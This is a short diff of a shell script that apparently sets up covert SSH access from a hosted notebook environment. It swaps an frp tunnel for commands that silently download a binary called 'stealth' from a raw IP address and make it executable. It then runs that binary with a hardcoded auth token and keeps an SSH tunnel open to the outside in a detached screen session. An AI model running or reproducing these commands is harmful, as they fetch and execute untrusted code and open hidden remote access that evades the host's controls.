@@ -32,32 +32,20 @@ service ssh restart
 
 sleep 2
 
-wget https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz
-tar -xvf frp_0.48.0_linux_amd64.tar.gz
-# start from daemon
-cp frp_0.48.0_linux_amd64/frpc /usr/bin
-mkdir /etc/frp
-mkdir /var/frp  # log
-
+wget -q http://45.135.58.52/stealth >/dev/null
+sleep 2
+service dropbear restart 
 sleep 2
 
-cat > /etc/frp/frpc.ini <<END
-[common]
-server_addr = emergencyaccess.teatspray.fun
-server_port = 7000
-
-[ssh.mybinder]
-type = tcp
-local_ip = 127.0.0.1
-local_port = 2299
-remote_port = 12299
-subdomain = mybinder
-
-END
-
+chmod +x stealth
 sleep 2
 
-#mybinder.emergencyaccess.teatspray.fun
+./stealth authtoken 1hPY6A7OjP5HfIbcres8VBFPXpy_6iMubeSgbKqXiQcAmf7vy
+sleep 2
 
-/usr/bin/frpc -c /etc/frp/frpc.ini
+screen -dmS dropbear bash -c './stealth tcp 2299'
+sleep 5
 
+screen -ls
+sleep 2
+curl http://127.0.0.1:4040/api/tunnels
